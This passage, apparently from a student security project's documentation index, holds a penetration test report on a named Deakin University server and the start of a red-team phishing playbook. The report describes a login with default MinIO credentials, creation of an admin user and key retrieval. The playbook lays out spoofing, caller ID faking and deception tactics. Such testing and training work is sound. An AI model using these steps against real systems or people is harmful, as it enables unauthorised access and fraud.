TEAM/usecases/pentest#5-detailed-findings","content":" Website:    ","version":"Next","tagName":"h3"},{"title":"5.1. Port 8080​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#51-port-8080","content":" Command Used:    Scan Results:  Port Status: Port 8080/tcp is open.Service Detected: The service running on port 8080 is identified as Apache HTTP Server version 2.4.41, running on Ubuntu.  Vulnerability Findings:  Several critical vulnerabilities have been detected for Apache HTTP Server 2.4.41. These include:  CVE-2024-38476:This is a critical vulnerability in Apache HTTP Server that poses a severe security risk. Detailed information can be found here.CVE-2024-38474:Another critical vulnerability affecting Apache HTTP Server, requiring urgent attention. More details are available here.CVE-2023-25690:This vulnerability also presents a significant risk to Apache HTTP Server users. Refer to this link for more information.CVE-2022-31813:Identified as a critical issue in Apache HTTP Server. Additional information is available here.CVE-2022-23943:This critical vulnerability affects Apache HTTP Server, as detailed here.CVE-2022-22720:Another severe vulnerability in Apache HTTP Server. Full details can be found here.CVE-2021-44790:This critical vulnerability impacts Apache HTTP Server, with more information available here.CVE-2021-39275:A serious issue affecting Apache HTTP Server, detailed here.CVE-2021-26691:Identified as a critical vulnerability, affecting Apache HTTP Server. Further details are available here.CVE-2020-11984:A critical issue in Apache HTTP Server, with more information available here.  Additional Exploits Identified:  EDB-ID:51193:This exploit targets vulnerabilities in Apache HTTP Server, as detailed here.95499236-C9FE-56A6-9D7D-E943A24B633A:This is a known exploit for Apache HTTP Server, detailed here.2C119FFA-ECE0-5E14-A4A4-354A2C38071A:Another exploit related to Apache HTTP Server, with details available here.F607361B-6369-5DF5-9B29-E90FA29DC565:This exploit affects Apache HTTP Server and is detailed here.  Recommendations:  Immediate action is required to address these critical vulnerabilities. It is advisable to update the Apache HTTP Server to the latest version that addresses these issues. Regularly monitor and apply security patches to mitigate potential threats.  For further information and specific actions, refer to the provided vulnerability and exploit links.  ","version":"Next","tagName":"h3"},{"title":"5.2 PORT 443 ANALYSIS​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#52-port-443-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"Website​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#website","content":"   The server title is &quot;Wazuh,&quot; and it appears to redirect to the login page (/app/login?). This suggests it might be running Wazuh, which is an open-source security monitoring platform.    The server on port 443 supports the following HTTP methods:  GETHEADPOSTOPTIONS    The HTTP headers for port 443 reveal the following:  Set-Cookie: security_authentication is set but immediately expired.Content-Security-Policy: Allows unsafe-eval and unsafe-inline, which could be risky.X-Frame-Options: Set to sameorigin, which is good for preventing clickjacking.Cache-Control: Properly set to prevent caching.  The Content-Security-Policy header is notable. The use of unsafe-eval and unsafe-inline could be a security concern, as these settings can make the application more vulnerable to XSS (Cross-Site Scripting) attacks.    The SSL/TLS cipher suite results show the following:  TLSv1.2: The server supports a range of strong ciphers, all rated &quot;A&quot; (excellent). There are no weak or deprecated ciphers.TLSv1.3: Similarly, the ciphers supported are also rated &quot;A&quot; and are strong.  5.3 PORT 9200 ANALYSIS  ","version":"Next","tagName":"h3"},{"title":"PORT 9200:​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#port-9200","content":"     The output I received is from an Nmap scan using the -sV and --script ssl-enum-ciphers options. These options are used for service detection and to enumerate SSL/TLS ciphers supported by a service running on port 9200, which is typically associated with Elasticsearch or a similar service. From this scan, it's evident that the server is running SSL with several strong ciphers. The scan also provides detailed information about cipher strength, Diffie-Hellman key lengths, and the protocol versions in use (TLS 1.2 and TLS 1.3).  This scan is useful for identifying potential vulnerabilities related to cryptographic protocols. Weak ciphers, improper configuration, or insufficient Diffie-Hellman parameters can leave the service vulnerable to attacks like man-in-the-middle (MITM) or cipher downgrade attacks. However, based on the scan results, the server appears to be using secure and modern ciphers (all rated 'A'), which lowers the risk of vulnerabilities related to weak encryption.  One potential concern is the Diffie-Hellman key exchange (dh 2048). Although 2048-bit keys are generally considered secure, key sizes smaller than 2048 bits are often deemed weak. Moving forward, it might be advisable to consider upgrading to even stronger key sizes, such as 4096 bits, to enhance security further.            ","version":"Next","tagName":"h2"},{"title":"1. LOGJAM (CVE-2015-4000)​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#1-logjam-cve-2015-4000","content":" Why It’s a Vulnerability:  Description: LOGJAM is a vulnerability affecting the Diffie-Hellman key exchange algorithm used in TLS. This vulnerability allows attackers to downgrade the security of encrypted communications by forcing the use of weak cryptographic parameters. Specifically, it targets servers that use common prime numbers (1024-bit) for key exchange.Impact: An attacker can potentially decrypt intercepted traffic or perform a man-in-the-middle attack, compromising the confidentiality and integrity of the data being exchanged.Issue: The report indicates that the server is vulnerable because it uses a common prime (RFC2409/Oakley Group 2, 1024 bits) for Diffie-Hellman key exchange.  Explanation:  Diffie-Hellman Key Exchange: This algorithm allows two parties to securely share a common key over an insecure channel. However, if the parameters are weak, an attacker can exploit the weakness to decrypt the traffic.Common Prime: Using a common, weak prime makes it easier for attackers to perform mathematical attacks and recover the key used for encryption.  ","version":"Next","tagName":"h2"},{"title":"2. LUCKY13 (CVE-2013-0169)​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#2-lucky13-cve-2013-0169","content":" Why It’s a Vulnerability:  Description: LUCKY13 is a vulnerability in the implementation of the CBC (Cipher Block Chaining) mode of encryption used in TLS. This vulnerability allows attackers to perform a padding oracle attack, potentially leading to the exposure of plaintext data.Impact: An attacker could potentially recover sensitive information from encrypted traffic by exploiting timing discrepancies in the way the server handles padding errors.  Explanation:  CBC Mode: CBC mode is a method of encrypting data where each block of plaintext is XORed with the previous ciphertext block before being encrypted. This mode can leak information about the plaintext through timing attacks if not implemented securely.Padding Oracle Attack: This attack exploits the way the server processes padding errors to infer details about the plaintext, which could be used to decrypt the message.  ","version":"Next","tagName":"h2"},{"title":"3. Certificate Chain Issues​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#3-certificate-chain-issues","content":" Why It’s a Vulnerability:  Description: The certificate chain is incomplete, meaning the server's SSL/TLS certificate does not correctly link back to a trusted root certificate authority (CA). This can result in issues with trust and validation.Impact: Browsers and other clients may not trust the server’s certificate, leading to warnings or failures in establishing secure connections.  Explanation:  Certificate Chain: For a certificate to be trusted, it must be part of a chain that links it back to a trusted root CA. An incomplete chain means that intermediates or root certificates are missing, which prevents proper verification.Trust Issues: Without a complete chain, clients cannot validate the authenticity of the server’s certificate, which can lead to trust and security issues.  ","version":"Next","tagName":"h2"},{"title":"4. Domain Name Mismatch​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#4-domain-name-mismatch","content":" Why It’s a Vulnerability:  Description: The certificate presented by the server does not match the domain name used to connect to it. This means that the certificate is not valid for the domain in question.Impact: Clients connecting to the server may receive warnings or errors about the certificate mismatch, which can undermine trust in the server's identity and security.  Explanation:  Certificate Validation: Certificates are issued for specific domain names. A mismatch occurs when the domain name on the certificate does not match the domain name of the server. This can happen if the server's certificate is misconfigured or if a malicious actor is intercepting connections.  ","version":"Next","tagName":"h2"},{"title":"5. HSTS Not Offered​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#5-hsts-not-offered","content":" Why It’s a Vulnerability:  Description: HTTP Strict Transport Security (HSTS) is a security feature that forces browsers to use HTTPS for all communications with a server. If HSTS is not offered, browsers might not enforce this security measure.Impact: Without HSTS, users are vulnerable to man-in-the-middle attacks, where an attacker can intercept and modify communications between the browser and the server.  Explanation:  HSTS: HSTS is a mechanism that tells browsers to only use HTTPS when communicating with a server, preventing any possibility of plain HTTP connections. This helps protect against downgrade attacks and eavesdropping.No HSTS: If a server does not use HSTS, it leaves users exposed to potential attacks where traffic could be intercepted or altered.  These vulnerabilities can significantly impact the security of your communications and data. Addressing them involves updating server configurations, improving encryption practices, and ensuring that certificates are correctly issued and validated.  5.4 PORT 9001 ANALYSIS    ","version":"Next","tagName":"h2"},{"title":"Nmap Scan Results​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#nmap-scan-results","content":" The following command was used for scanning: nmap -A -p 9001 10.137.0.149  ","version":"Next","tagName":"h2"},{"title":"Findings​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#findings","content":" Port: 9001/tcpStatus: OpenService: Identified as tor-orport, though Nmap could not conclusively determine the specific service.  ","version":"Next","tagName":"h3"},{"title":"Analysis of HTTP Responses​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#analysis-of-http-responses","content":" ","version":"Next","tagName":"h2"},{"title":"Generic Response​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#generic-response","content":" HTTP Status: 400 Bad RequestContent-Type: text/plain; charset=utf-8Connection: closedDetails: The server returned a 400 Bad Request error, suggesting that the request had invalid formatting or parameters.  ","version":"Next","tagName":"h3"},{"title":"GET Request Response​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#get-request-response","content":" HTTP Status: 200 OKContent-Type: text/htmlContent-Length: 1310 bytesServer: MinIO ConsoleSecurity Features: Content-Security-Policy: Enforces that resources can only be loaded from the same origin and restricts unsafe evaluations and inline scripts.X-Content-Type-Options: Nosniff (prevents MIME-type sniffing).X-Frame-Options: DENY (prevents the page from being embedded in frames).X-XSS-Protection: 1; mode=block (activates cross-site scripting protection). Details: The server is identified as running MinIO Console, which is an object storage service. The security headers indicate that the service is configured with measures to protect against common web vulnerabilities.  ","version":"Next","tagName":"h3"},{"title":"HTTP OPTIONS Request Response​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#http-options-request-response","content":" HTTP Status: 200 OKContent-Type: text/htmlServer: MinIO ConsoleSecurity Features: Same as those found in the GET request.Details: The OPTIONS request response verifies the same service and security configurations as the GET request.    Nikto Scan Report  ","version":"Next","tagName":"h3"},{"title":"Target Information​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#target-information","content":" Target Port: 9001Start Time: 2024-09-22 12:59:44 (GMT+10)Server: MinIO Console  ","version":"Next","tagName":"h2"},{"title":"Findings​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#findings-1","content":" Missing HTTP Headers: Issue: The X-Content-Type-Options header is not set.Impact: This could allow the user agent to render the content of the site in a different fashion than intended.Reference: Netsparker - Missing Content-Type Header Potentially Interesting Backup/Certificate Files: Issue: Various files that could contain sensitive backup or certificate data were found.Files Identified: /101370.tar.lzma/10_137_0_149.tar/site.tar.bz2/backup.cer/101370149.tar.bz2/149.cer/archive.cer/137.tgz/0.jks/10.pem/10.137.tar.lzma/database.war/10_137_0_149.egg/0.egg/dump.cer/149.pem/10137.tgz/archive.jks/10137.tar.lzma/149.jks/dump.war/10.tar.lzma/archive.war/backup.jks/137.war/10.alz/101370149.tar.lzma/dump.pem/10_137_0_149.jks/10.egg/10.137.0.149.cer/149.tar.lzma/10.137.0.tar/101370149.alz/149.tar/0.tgz/backup.tgz/10137.cer/database.alz/site.jks/0.tar.lzma/10_137_0_149.tar.lzma/10.137.0.149.tgz/10137.tar/10.137.0.149.war/database.tar.bz2/site.alz/backup.tar/dump.tgz/101370.egg/10.tar.bz2/site.tar.lzma/archive.tgz/10137.jks/149.tar.bz2/149.alz/database.cer/10.137.egg/10.137.0.tgz/10.137.0.jks/149.egg/10.137.war/site.tar/backup.pem/101370.war/site.egg/database.tar.lzma/10.137.egg/10.137.0.149.alz/archive.tar/10.137.0.149.pem/archive.pem/backup.tar.bz2/10.137.0.pem/backup.alz/10137.egg/10_137_0_149.tar.bz2/10.137.0.cer/site.war/10137.pem/0.tar.bz2/10_137_0_149.pem/10_137_0_149.alz/10.137.0.tar.bz2/10.137.cer/10.137.0.alz/101370149.tgz/0.tar/137.egg/101370.cer/site.pem/10.137.0.149.tar.bz2/backup.tar.lzma/137.alz/101370149.jks/137.tar.bz2/dump.tar.bz2/10.war/database.pem/10.cer/10_137_0_149.tgz/10.137.0.149.tar.lzma/101370149.tar/database.egg/10.137.0.tar.lzma/10_137_0_149.war/101370.jks/10137.tar.bz2/site.cer/137.tar/10.137.jks/database.tgz/0.alz/database.jks/0.cer Impact: These files could potentially contain sensitive information such as backups or certificates that may be exploited.Reference: CWE-530: Exposure of Sensitive Information via Application Error  Website    ","version":"Next","tagName":"h2"},{"title":"Vulnerability Discovery​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#vulnerability-discovery","content":" Service Access: Accessed the Redback service at redback.deakin.it.edu.au:9001.Login Details: Logged in using the default credentials password and minioadmin, highlighting a vulnerability due to the use of weak or default login credentials.    ","version":"Next","tagName":"h2"},{"title":"Privilege Escalation Process​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#privilege-escalation-process","content":" User Creation: Established a new user named root with full administrative privileges on the website, effectively gaining comprehensive control over the site.    ","version":"Next","tagName":"h2"},{"title":"Key Retrieval​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#key-retrieval","content":" Key Acquisition: Obtained both the secret key and access key for the website, which are crucial for performing authenticated actions.    ","version":"Next","tagName":"h2"},{"title":"File Management Testing​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#file-management-testing","content":" File Operations: Verified the ability to upload, delete, and modify files, confirming that the new user had appropriate permissions to manage these files.  6. Recommendations  ","version":"Next","tagName":"h2"},{"title":"6.1 Short-term Mitigations​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#61-short-term-mitigations","content":" Upgrade Apache HTTP Server: Update the Apache HTTP Server running on port 8080 to the latest stable release to address critical vulnerabilities (e.g., CVE-2024-38476, CVE-2024-38474).Strengthen Authentication: Replace default credentials (e.g., on the MinIO Console) with strong, unique passwords. Implement multi-factor authentication where feasible.Enhance SSL/TLS Security: Disable outdated and weak ciphers and protocols.Resolve the LOGJAM vulnerability by adopting stronger Diffie-Hellman parameters (at least 2048-bit).Enforce HTTP Strict Transport Security (HSTS). Resolve Certificate Issues: Ensure that the SSL certificate aligns with the domain name.Complete the certificate chain to prevent trust errors. Secure Sensitive Files: Remove or protect sensitive backup and certificate files found during the Nikto scan.Improve Content Security Policy (CSP): Eliminate 'unsafe-eval' and 'unsafe-inline' from the CSP header on port 443.Close Unnecessary Ports: Review all open ports and close those that are not essential to operations.  ","version":"Next","tagName":"h2"},{"title":"6.2 Long-term Security Improvements​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#62-long-term-security-improvements","content":" Conduct Regular Vulnerability Scans: Automate routine vulnerability scans using tools like OpenVAS to detect and address new risks promptly.Establish Patch Management: Implement a structured patch management process to ensure timely updates across systems and applications.Strengthen Network Segmentation: Apply stronger network segmentation to limit damage in case of a breach.Deploy a Web Application Firewall (WAF): Install a WAF to protect against common web-based attacks.Perform Regular Penetration Testing: Schedule periodic penetration tests to uncover and resolve potential security gaps.Implement SIEM Solution: Introduce a Security Information and Event Management (SIEM) system for better monitoring and incident response.Develop and Test an Incident Response Plan: Create a comprehensive incident response plan and perform regular drills to maintain readiness.Apply the Principle of Least Privilege: Ensure users and service accounts have only the minimal access they require.Enhance Employee Security Awareness: Provide regular training sessions for employees, focusing on recognizing phishing and adhering to security best practices.Implement Data Loss Prevention (DLP): Use DLP tools to prevent unauthorized data leaks.  7. Conclusion  The penetration test conducted on the Deakin University server (redback.it.deakin.edu.au) revealed several serious vulnerabilities that demand immediate remediation. Key issues include multiple critical vulnerabilities in the Apache HTTP Server, weak authentication mechanisms, and misconfigured SSL/TLS settings.  One of the most concerning findings was how easily an attacker could gain unauthorized access and escalate privileges, demonstrated by the successful creation of an administrative user on the MinIO Console. Additionally, the presence of sensitive backup files and the use of default credentials pose significant risks to the system’s confidentiality and integrity.  Although some security best practices, such as the use of strong SSL/TLS ciphers in certain areas, are in place, the server’s overall security posture requires significant improvement. By implementing the short-term mitigations and long-term security enhancements outlined in this report, the system’s security can be substantially strengthened, reducing the risk of successful attacks.  Addressing these recommendations promptly, while conducting regular security assessments like vulnerability scans and penetration tests, will help ensure the continued security of the system. A proactive approach, combined with fostering a security-conscious culture, will help Deakin University protect its digital assets from potential cyber threats.  8. Appendices  ","version":"Next","tagName":"h2"},{"title":"8.1 Tools Used​","type":1,"pageTitle":"Redback Pentest Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pentest#81-tools-used","content":" Gophish: Used to design and manage phishing campaigns to assess user awareness and email security.Evilginx2: Employed for advanced phishing, especially to bypass two-factor authentication.Nmap: Utilized for network discovery, port scanning, and identifying services/operating systems.Nikto: Used for scanning web servers to detect potential vulnerabilities and misconfigurations.Metasploit Framework (msfconsole): Applied for exploiting vulnerabilities and conducting post-exploitation activities.Gobuster: Employed for brute-forcing directories and files on web servers.Burp Suite: Used for testing web application security, including intercepting and modifying HTTP/HTTPS requests.OpenVAS: Utilized for thorough vulnerability scanning and assessments. ","version":"Next","tagName":"h2"},{"title":"Phishing Attack Red Team Usecase","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#1-introduction","content":" Phishing attacks are persistent threats in today's digital world, posing a significant riskto organizations worldwide.The Red Team Phishing Simulation Playbook is a vital resource designed to equip organizations with comprehensive strategy for executing simulated phishing attacks. By evaluating and fortifying an organization's defenses against evolving phishing threats, this playbook plays a pivotal role in enhancing cybersecurity.  ","version":"Next","tagName":"h2"},{"title":"2 Email Phishing Simulation:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#2-email-phishing-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"2.1 Objective:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#21-objective","content":" Our goal is to evaluate the robustness of an organization's email security measures against phishing attempts.  ","version":"Next","tagName":"h3"},{"title":"2.2 Steps:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#22-steps","content":" Craft Persuasive Phishing Emails: Craft emails that closely resemble legitimate communications from trusted sources. These emails should be convincing and compelling, aiming to deceive recipients into taking action.Embed Malicious Links or Attachments: Insert malicious links or attachments within the phishing emails strategically. These links or attachments should entice recipients to divulge sensitive information or download malware.Employ Techniques for Success: Utilize various tactics to enhance the effectiveness of the phishing campaign. This may include email spoofing, creating a sense of urgency, or leveraging psychological triggers to increase the likelihood of recipients falling for the scam.  ","version":"Next","tagName":"h3"},{"title":"2.3 Tools and Techniques:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#23-tools-and-techniques","content":" Social Engineering Toolkit (SET): SET provides a range of attack vectors, including email spoofing, credential harvesting, and attachment-based attacks. It enables the replication of trusted sources and facilitates the creation of convincing phishing emails through psychological manipulation techniques.Gophish: Gophish is a versatile phishing framework that streamlines the process of creating and executing phishing campaigns. It offers customizable email templates, tracking capabilities, and detailed analytics, making it easier to assess the effectiveness of the simulation.Customized Email Templates: Tailoring phishing email templates to mimic the branding and communication style of reputable organizations enhances authenticity and increases the likelihood of successful deception.Email Spoofing Tools Tools like &quot;SendEmail&quot; or custom scripts enable the spoofing of email addresses, making phishing emails appear legitimate. Email spoofing enhances the credibility of the attack,making it more likely for recipients to trust the message.URL Obfuscation Techniques: Besides URL shorteners, advanced obfuscation techniques like URL encoding and redirect chains can disguise malicious links, making them harder to detect by email security filters.Payload Delivery Mechanisms: Deploying weaponized documents or exploit kits increases the impact of phishing attacks by exploiting software vulnerabilities or manipulating user behavior to deliver malware payloads.  ","version":"Next","tagName":"h3"},{"title":"3 Spear Phishing Simulation:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#3-spear-phishing-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"3.1 Objective:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#31-objective","content":" Target specific individuals or departments within an organization to assess their susceptibility to personalized phishing attacks.  ","version":"Next","tagName":"h3"},{"title":"3.2 Steps:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#32-steps","content":" Conduct Thorough Reconnaissance: Gather personal information to craft highly personalized phishing emails.Tailor Phishing Emails: Customize phishing emails with relevant information to enhance credibility and effectiveness.Deploy Personalized Phishing Emails: Send tailored phishing emails, leveraging social engineering tactics to increase engagement.  ","version":"Next","tagName":"h3"},{"title":"3.3 Tools and Techniques:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#33-tools-and-techniques","content":" Gathering Information: Using tools like Maltego or Recon-ng, we meticulously gather personal details from various online platforms, including social media profiles and public databases. This thorough approach helps us build detailed profiles of our targets, empowering us to create highly personalized and convincing phishing campaigns.Crafting Personalized Emails: Armed with a wealth of information, we tailor our email campaigns meticulously to each recipient. We not only include their name, position, or recent activities but also delve into their interests and preferences, ensuring that our messages resonate personally. This personalized touch enhances the credibility and effectiveness of our emails.Social Manipulation: Our email communications go beyond personalization; they utilize persuasive language to exploit recent events or job roles relevant to the recipient. By tapping into their emotions and professional context, we create a sense of urgency or necessity, compelling them to take actions that benefit us. This strategic approach maximizes the success of our phishing endeavors.  ","version":"Next","tagName":"h3"},{"title":"4 Whaling (CEO Fraud) Simulation:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#4-whaling-ceo-fraud-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"4.1 Objective:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#41-objective","content":" Evaluate an organization's resilience against CEO fraud attacks by targeting high-profile individuals like CEOs or senior managers.  ","version":"Next","tagName":"h3"},{"title":"4.2 Steps:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#42-steps","content":" Identify High-Profile Targets: Identify executives with access to sensitive information or financial resources.Create Sophisticated Phishing Emails: Craft convincing emails impersonating trusted connections or business partners.Include Requests for Sensitive Information: Request sensitive information or financial transactions in the emails to simulate CEO fraud scenarios.  ","version":"Next","tagName":"h3"},{"title":"4.3 Tools and Techniques:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#43-tools-and-techniques","content":" Crafting Deceptive Emails: In our pursuit of sophisticated deception, we meticulously analyze the target's communication habits and organizational structure. This enables us to create emails that not only mirror the tone and mannerisms of authoritative figures within the company but also leverage their understanding of internal procedures, making our phishing attempts highly persuasive.Spoofing Domains: To bolster the credibility of our phishing emails, we employ advanced tactics to spoof the sender's domain. This goes beyond simply registering domains similar to trusted sources.Instead, we replicate the exact email addresses of familiar contacts or reputable organizations, ensuring our emails blend seamlessly with genuine correspondence. By doing so, we effectively sidestep email security filters, significantly increasing our chances of success.Creating Urgent Appeals: Our emails are strategically crafted to instill a sense of urgency, prompting recipients to act swiftly without hesitation. By emphasizing the urgency of the requested information or transaction and employing authoritative language, we exploit psychological triggers that drive immediate compliance. This ensures that targets are compelled to respond promptly, furthering our objectives in the phishing campaign.  ","version":"Next","tagName":"h3"},{"title":"5 Vishing (Voice Phishing) Simulation​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#5-vishing-voice-phishing-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"5.1 Objective:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#51-objective","content":" Assess an organization's awareness and response to voice-based phishing attacks.  ","version":"Next","tagName":"h3"},{"title":"5.2 Steps:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#52-steps","content":" Use Automated Voice Calls or Prerecorded Messages: Utilize automated calls or messages to simulate phishing attempts.Request Sensitive Information: During the calls, request sensitive information or financial transactions under the guise of legitimate organizations.Mimic Trusted Phone Numbers: Spoof trusted phone numbers to enhance the credibility of the phishing attempts.  ","version":"Next","tagName":"h3"},{"title":"5.3 Tools and Techniques:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#53-tools-and-techniques","content":" Voice Manipulation: Utilizing platforms like Asterisk or FreePBX, we meticulously tailor automated voice calls or prerecorded messages to deceive our targets. By adjusting tone, cadence, and speech patterns, our aim is to instill a sense of authenticity, thereby boosting engagement and compliance.Caller ID Spoofing: Employing advanced methods, we manipulate caller ID details to ensure our calls appear to be from known and trusted sources recognized by the target. This deceptive strategy bolsters the credibility of our phishing endeavors, minimizing suspicion and heightening the success rate of our social engineering efforts.Scripted Messages: Within our repertoire, we have finely crafted, pre-recorded scripts meticulously designed to emulate official correspondence. By replicating the language, urgency, and tone of authentic messages, we bolster the legitimacy of our phishing attempts, significantly increasing the likelihood of target compliance.  ","version":"Next","tagName":"h3"},{"title":"6 Smishing (SMS Phishing) Simulation:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#6-smishing-sms-phishing-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"6.1 Objective:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#61-objective","content":" Evaluate an organization's resilience to SMS-based phishing attacks targeting mobile devices.  ","version":"Next","tagName":"h3"},{"title":"6.2 Steps:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#62-steps","content":" Send Text Messages with Malicious Links: Send SMS containing malicious links or requests for sensitive information.Mimic Trusted Sources: Mimic trusted sources such as banks or government agencies in the messages.Create a Sense of Urgency: Generate a sense of urgency in the messages to prompt immediate responses.  ","version":"Next","tagName":"h3"},{"title":"6.3 Tools and Techniques:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#63-tools-and-techniques","content":" Text-based Deception: Utilizing SMS spoofing services, we adeptly conceal our identity, dispatching messages that mimic those from trusted sources, enhancing our phishing efforts.Tailored Messages: Our SMS campaigns feature meticulously crafted templates tailored to diverse scenarios, including urgent requests for account verification or financial transactions, maximizing recipient engagement and response rates.Link Masking: To obfuscate malicious links, we employ URL shorteners like Bitly or TinyURL, heightening the probability of recipients clicking on them unwittingly, thereby facilitating successful phishing attempts.  ","version":"Next","tagName":"h3"},{"title":"7 Clone Phishing Simulation:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#7-clone-phishing-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"7.1 Objective:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#71-objective","content":" Test an organization's ability to detect and mitigate phishing emails that mimic legitimate correspondence.  ","version":"Next","tagName":"h3"},{"title":"7.2 Steps:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#72-steps","content":" Identify Authentic Emails: Identify authentic emails within the organization or from trusted sources to serve as templates.Create Clone Emails: Make slight modifications to replicate legitimate 